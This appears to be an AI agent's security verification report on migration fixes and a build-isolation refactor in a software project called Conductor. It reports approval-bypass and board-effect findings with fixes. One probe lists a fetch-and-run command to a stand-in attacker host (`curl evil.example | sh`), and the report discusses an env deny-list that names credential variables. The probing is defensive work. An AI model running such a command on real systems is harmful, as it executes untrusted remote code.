# Security verification: M1c/M1d fixes (492141b) and M2 step 1 (7bf6cce characterization, 17f18ac envelope extraction)

- Subject: clone `/Volumes/Sandisk/github/techteam-conductor-v2`; the fixes are verified at HEAD `492141b` (which contains `17f18ac`); the characterization commit `7bf6cce` was exported separately to prove the tests pass on the pre-extraction code. Exports via `git archive`; no source edited, only this file written.
- Rules kept: throw-away `CONDUCTOR_HOME` / `CONDUCTOR_BACKUP_DIR` / `HOME`; no real CLI (fake agents only); `~/.conductor`, `~/.conductor-v2`, `~/.conductor-backups`, `~/Library/LaunchAgents` untouched. Probe scripts: `/private/tmp/claude-501/-Volumes-Sandisk-github-techteam-conductor/7b88419e-600f-4142-ac15-d9bbfc9a540e/scratchpad/sec/c4/*.ts` and `.../sec/m3/test/zz-*.test.ts`.
- Test baseline (492141b, fake HOME, 18 files incl. `envelope`, `migrate`, `migrate-hardening`, `security-m1b`, `engine-*`, `lock`, `board`, `schema`, `server`, `core`, `agents`): 284 tests, 283 pass, 1 skipped, 0 fail. `envelope.test.ts` alone: 22/22. The characterization file at `7bf6cce` against the PRE-extraction code: E1-E12 pass, E13 is a documented `todo` (fails before, passes after the `finally`), as intended.

## Part 1 — M1c/M1d findings: verification

Everything below was re-run with my own probes against the `492141b` export (v1 folders byte- and mtime-compared before/after).

| ID | Result | Evidence |
| --- | --- | --- |
| C-1 `--to` inside `--from` | **Closed** | `migrate({from, to: from/v2-import, apply})` now throws `overlap`; v1 folder gained nothing (entries: `config.json runs state.json`). Real-path check, both directions plus the `to` parent. |
| C-2 skeleton publish | **Closed** | Three race variants (a "running v2" creates `run/lock.json`, `board/journal.ndjson` or `logs/x.log` between the check and the publish): each throws `target_changed`-style error, the target is left exactly as it was (`board home.json logs run runs` all present, marker intact), no staging left behind. Rename-aside + re-check + rollback works. |
| C-3 hardened reader | **Closed** | Symlinked run dir / `run.json` / artifact: skipped with a warning each, nothing outside v1 imported, backup consistent; FIFO `run.json`: dry run finishes; 700 MB sparse artifact: skipped in 3 ms (RSS 100 MB); config `version -300000000`: rejected in 1 ms; title object, description number, history string, key traversal, key naming another run: each skips THAT run with a warning, no raw error, v1 unchanged; an unreadable/corrupt/dir-shaped `run.json` or a file named like a key: skipped. Residual R-2 below (a different hostile-field class). |
| C-4 imports need approval | **Mostly closed — one path still builds without approval (R-1)** | needs_human, ready, and a `schemaVersion: 3` needs_human import: after the user's Retry/To do they stop at `awaiting_approval`, "approval requested", 0 builder calls. A parked import whose `parkedFrom` is `needs_human` and whose `needsHuman.origin` is `build` still builds with no approval (see R-1). |
| C-5 imported commands shown | **Closed** | `MigrateReport.willRun` lists gate commands, setup, `envPassthrough`, copy files, agent binaries (my probe: `curl evil.example | sh`, `echo pwned`, `/tmp/evil-claude` all appear); the CLI prints them with "only migrate a folder you created". |
| C-6 staged modes | **Closed** | Source `plan-1.json` 0644 and `events.ndjson` 0666: staged copies are 0600; backup files 0600. |
| C-7 key numbers, unknown status, re-list | **Closed** | `ABC-999999999` skipped with a warning (no counter poisoning); unknown status parked as needs_human; a run directory created in v1 during the import now makes apply refuse (`changed_during_import`). |
| C-8 backup allow-list + cap | **Closed** | Backup of a folder with `notes.txt`, a newline-named file and artifacts contains only `run.json` and the importable artifacts; skipped files are listed. |
| C-9 / B-6 docs | **Corrected, one sentence still wrong** | README/ARCHITECTURE now say v2 "never writes to" v1, "built aside, then one rename", backups kept until you delete them, the run-detail API returns stored text. Still inaccurate: "a parked import retries from the plan" (README, ARCHITECTURE data-folder paragraph) is false for R-1. |
| C-10 test home guard | **Closed** | With `NODE_TEST_CONTEXT` set and no `CONDUCTOR_HOME`, `conductorHome()` throws; the preload still overrides both variables. |
| B-2 residuals | **Closed** | `assertOwnedWorktree`: legit worktree accepted; same path on a detached HEAD refused; a symlink at the expected path pointing at a foreign checkout refused; a path other than the expected one refused. The unregistered-repo case throws inside `rerunFromHuman`'s try (backup/reset skipped); read, not executed. |
| B-6 deferral | **Accepted** | Not blocking; the documentation now states the limit accurately. |

### New residual findings (found while verifying)

#### R-1 (Medium, blocking) — a parked import still builds straight from the imported plan, without approval
Evidence (reproduced with the harness, synthesized v1 folder, migrated, v2 engine with fake agents): import `status: parked`, `parkedFrom: needs_human`, `needsHuman: {origin: 'build'}`, `planApproved: true`. After import it has `untrusted: true`, `planApproved: false`, but `needsHuman.origin` is still `build` and `parkedFrom` still `needs_human`. The user moves the card to To do: `rerunFromHuman` derives `retryStage = 'build'` from `was = parkedFrom` and `origin`, sets `next = 'build'`, and the run reaches `ready` with 1 `--force` Cursor build and `approval requested = false`. The other imports (needs_human, ready, schemaVersion 3) correctly stop at `awaiting_approval`. The importer only rewrites `needsHuman.origin` when `status === 'needs_human'` (migrate.ts, `needsHuman: e.status === 'needs_human' ? {…origin:'plan'} : e.run.needsHuman`) and the new test covers `ready/needs_human/finished/awaiting_approval` only. This is realistic data, not just hostile: v1's "Park in Backlog" keeps `needsHuman`. It also makes the README/ARCHITECTURE sentence "a parked import retries from the plan" untrue.
Fix: in the importer, for EVERY imported run set `needsHuman.origin = 'plan'` when `needsHuman` exists and clear `parkedFrom` (or map it to `'ready'`); and add the structural guard in the engine so no future path can regress it: in `rerunFromHuman`, never use `retryStage` for an `untrusted` run whose `approvedBy` is unset (re-plan, ask approval). Add `parked`, `parked + needs_human origin build`, `failed`, `paused` to the C-4 test.

#### R-2 (Medium, blocking) — a v1 run record can point Conductor's own board effects at arbitrary cards
Evidence (reproduced): a run.json with `schemaVersion: 3` (so `coerceV1Run` skips `migrateRunV1ToV2`, which is the only place that blanks `bugs[].itemId/itemKey`) and `bugs: [{status:'open', itemId:'IMP-5', …}]`. After import and the user's Retry of that run, an unrelated user card `IMP-5` (created in Backlog after the import) was moved to `done` by Conductor (`lane = done`). Cause: `rerunFromHuman` queues `effects.close(…, b.itemId, 'done')` for open bugs, and `Effects.apply` then calls `board.setLane(p.itemId, …, 'conductor')` / `board.addComment(p.itemId, …)` for any item key or id, with no check that the target is a child of this run's card. `done` satisfies other cards' dependencies, so this can start dependent auto-start cards. Needs a hostile folder plus a deliberate Retry on that card, but it breaks the intent of "every import is untrusted" (an imported run must not be able to act on other cards).
Fix (both): (a) importer: always drop `bugs[].itemId/itemKey` (and any other id-bearing field) regardless of `schemaVersion`; (b) `Effects.close`/`commentOn`: resolve the target and require `target.parentId === run.itemId` (and same project) before applying; otherwise mark the effect permanently failed with a log line. Test: foreign `itemId` in a bug record → no lane change, no comment on the other card.

Decision (M1c/M1d fixes): Changes requested

Blocking list for Part 1:
1. R-1: normalize `needsHuman.origin`/`parkedFrom` for every imported run; add the engine-level rule (an `untrusted` run without a v2 approval always re-plans); extend the C-4 test; fix the "parked import retries from the plan" sentence only if the behaviour is not changed.
2. R-2: scrub imported bug ids unconditionally and make board effects refuse targets that are not this run's own children; test.

Everything else in C-1..C-10, the B-2 residuals and the B-6 deferral is closed.

## Part 2 — M2 step 1 (conditions 1a-1i) against the code

| Condition | Result | Evidence |
| --- | --- | --- |
| 1a single choke point | **Met by construction + static test; one caveat** | `pipeline/envelope.ts` `runBuild()` is the only caller of `build.run` (E20 greps `src/`: `b.run(` / `.build.run(` only in the envelope; `runCursor(` only in its definition, the two ask-mode callers and the Cursor adapter; `agents/provider.ts` and `doctor.ts` never contain `mode: 'build'`). `Agents.provider(id)` is public and returns the live registry object, so "not exported" is true at module level but any code holding `agents` can reach `build.run` (the live `cursor-nopush` test does this on purpose with `{guardSha: null, envOnly: false}`); the guarantee is the static test, not the type system. See M2-6. |
| 1b eligibility re-asserted | **Met; one weakness (M2-2)** | `buildEligibility()` runs first inside `runBuild`, derived from `capabilitiesOf(provider)`: `build = typeof p.build?.run === 'function'`, `buildIsolationVerified` from `verification.ts` (frozen code constant `{cliVersion:'2026.10.19', grandfathered:true, source:'bundled-repo-suite'}`, `Object.hasOwn` lookup). Nothing reads config. E19: provider without `build`, or a `claude` object with a build function but no baseline, is held with zero spawns; removing the Cursor build at runtime holds the card ("no build capability"). |
| 1c prepare/verifyGuard fail closed | **Met** | E14 (verify throws), E15 (prepare throws / rejects → zero spawns), E16 (declares a guard but lacks prepare or verify → refused, zero spawns). A `prepare` returning nothing also holds. Verified in the code path: errors in `verifyGuard` become `{ok:false}`. |
| 1d prepare env sanitising | **Met for the specified keys; deny-list is thin (M2-3)** | E18: `GIT_*`, `HOME`, `PATH`, `CODEX_*`, `XDG_*`, `LD_*`, `DYLD_*`, `NODE_OPTIONS` are dropped (case-insensitive), the envelope's git env always wins (`GIT_CONFIG_GLOBAL=/dev/null`, `GIT_ASKPASS=/usr/bin/false` observed in the child), merge order `provider < extraEnv < envelope`. |
| 1e meta restore in `finally` | **Met** | E13 passes after the extraction and fails (as `todo`) before it: a provider that throws after the builder planted a hook / alias / pushurl still has them restored, and the exception is re-thrown (no commit, no pass: E12). Limit, abort, timeout and error results restore through the same path before any branching on `res.ok`. |
| 1f characterization first | **Met** | `7bf6cce` (tests only) precedes `17f18ac`; the 12 characterization tests pass on the old code (13 tests, 12 pass + the E13 `todo`) and the same file passes unchanged afterwards, plus E14-E22. Ordering preserved: guard → git env → snapshot → run → restore (before `res.ok`) → guard verify (only when ok) → commit guard → branch scans; I diffed it against the v1 build lifecycle and found one benign difference: `buildFails` is reset in `onResult` before the tamper/guard checks instead of after them. |
| 1g run migration v2→v3 | **Met** | E21: `cursorGuardSha→guardSha`, `noPushEnvOnly→guardEnvOnly` carried; neither field ⇒ `guardEnvOnly: true`; existing new fields never overwritten; the importer also runs `migrateRunV2ToV3`. E22: the API still shows `noPushEnvOnly` as a derived view; `guardEnvOnly` is a first-class `Run` field. |
| 1h tracked `.cursor/cli.json` ⇒ env-only | **Met** | E7: a repo with a tracked `.cursor/cli.json` records `guardEnvOnly: true`, no hash, and the same timeline note as v1. |
| 1i registry label | **Met for the build path** | Commit trailer `Built by Conductor (<label>)` and the build-failure notes come from `PROVIDER_LABEL`. Three read-only/limit sites still use `limit.provider === 'claude' ? 'Claude' : 'Cursor'` (`stages.ts` lines 141, 160; `server/open.ts:58`); fine until Codex exists, must go with commit 3. |

The Codex-specific condition "`registry.codex.build === undefined` (test)" is not testable yet (no Codex provider in this step); it must land with commit 3.

### Findings on the extraction

#### M2-1 — answer to your E17 question: yes, tighten the `guard: false` path
E17 shows that an adapter object can set `guard: false`, drop `prepare`/`verifyGuard`, and still build inside the envelope (recording `guardEnvOnly: true`). I reproduced the underlying property: the registry's provider objects are mutable (`Object.isFrozen` is false), and assigning `guard = false` on the live Cursor object leaves `buildEligibility` at `ok: true`. The guard requirement therefore lives on a mutable, adapter-supplied flag rather than in the verification baseline, although the baseline is exactly what justifies trusting Cursor with `--force` (the live suite showed the env layer alone let 5 of 9 variants through). Required tightening:
- add `guard: 'file' | 'sandbox'` to the baseline record (Cursor: `'file'`) and make `runBuild` require `b.guard === (baseline.guard === 'file')`, i.e. a provider cannot opt out of a guard its verification depends on; a future sandbox-based provider (Codex, M2b) is allowed `guard: false` only if its verification record says `'sandbox'`;
- deep-freeze the provider objects returned by `createProviders` (tests that need to mutate go through an explicit test seam);
- consistency check on `prep`: when `guard` is true and `envOnly` is false the hash must be present; `envOnly` true with a hash is contradictory ⇒ held (today a provider returning `{guardSha: null, envOnly: false}` is recorded as "not env-only" without any guard).
Keep E17 as a test of the allowed case only (sandbox-verified provider), and add the negative case.

#### M2-2 (Low-Medium) — eligibility is keyed by provider id, not by the registry's own object
Reproduced: `buildEligibility({id: 'cursor', label: 'Cursor', build: {guard: false, run: …}})` returns `ok: true` (capabilities `build: true, buildIsolationVerified: true`), because the verification lookup uses `p.id` only. Any in-process caller constructing such an object (a future route, a plugin point, a test helper leaking into src) is trusted as Cursor. Fix: `runBuild` takes a `ProviderId` and looks the provider up in the registry (or compares identity with `registry[id]`); object arguments are rejected.

#### M2-3 (Low-Medium) — `sanitizePrepEnv` is a deny-list
Reproduced: `GH_TOKEN`, `SSH_AUTH_SOCK`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `NODE_PATH`, `RUBYOPT` all pass the sanitiser (and so would any future credential or interpreter-startup variable). It only protects against adapter bugs (adapters are our code), but the whole point of the filter is to bound them. Use an allow-list: each adapter declares the exact key names or a prefix it may set (`CURSOR_`), everything else is dropped, and E18 asserts the allow-list.

#### M2-4 (Low) — snapshot failure runs the builder unprotected
`const snap = await snapshotGitMeta(i.repoPath).catch(() => null)`; when the snapshot cannot be taken, the build proceeds with no tamper detection and no restore (pre-existing v1 behaviour, now centralised). In the envelope this should be fail-closed (hold with "git settings could not be snapshotted; nothing was started").

#### M2-5 (Info) — static-test limits
E20 matches `b.run(` and `.build?.run(` patterns in `src/`; `build['run'](…)`, destructuring (`const {run} = provider.build`) or a call from `test/live` are not covered (the live test is a deliberate attack probe and should stay allowed). Combine with M2-1's freeze and, optionally, a module-private token that only the envelope can supply to `build.run`.

#### M2-6 (Info) — public provider access
`Agents.provider(id)` exposes the full adapter, including `build.run`. Consider returning a read-only view (`{id, label, capabilities}`) to everything except the envelope.

Decision (M2 step 1): Approved with conditions

Conditions (apply before M2 commit 3, the Codex adapter, which is the first second builder-capable object; none blocks merging 1a/1b):
1. M2-1: bind the guard requirement to the verification baseline, deep-freeze the registry objects, add the `prep` consistency check and the negative tests.
2. M2-2: look the provider up by id inside `runBuild`; reject caller-supplied provider objects.
3. M2-3: replace the env deny-list with a per-adapter allow-list.
4. M2-4: hold when the git-meta snapshot cannot be taken.
5. Commit 3 must also add the `registry.codex.build === undefined` test and replace the remaining provider-name ternaries (1i).
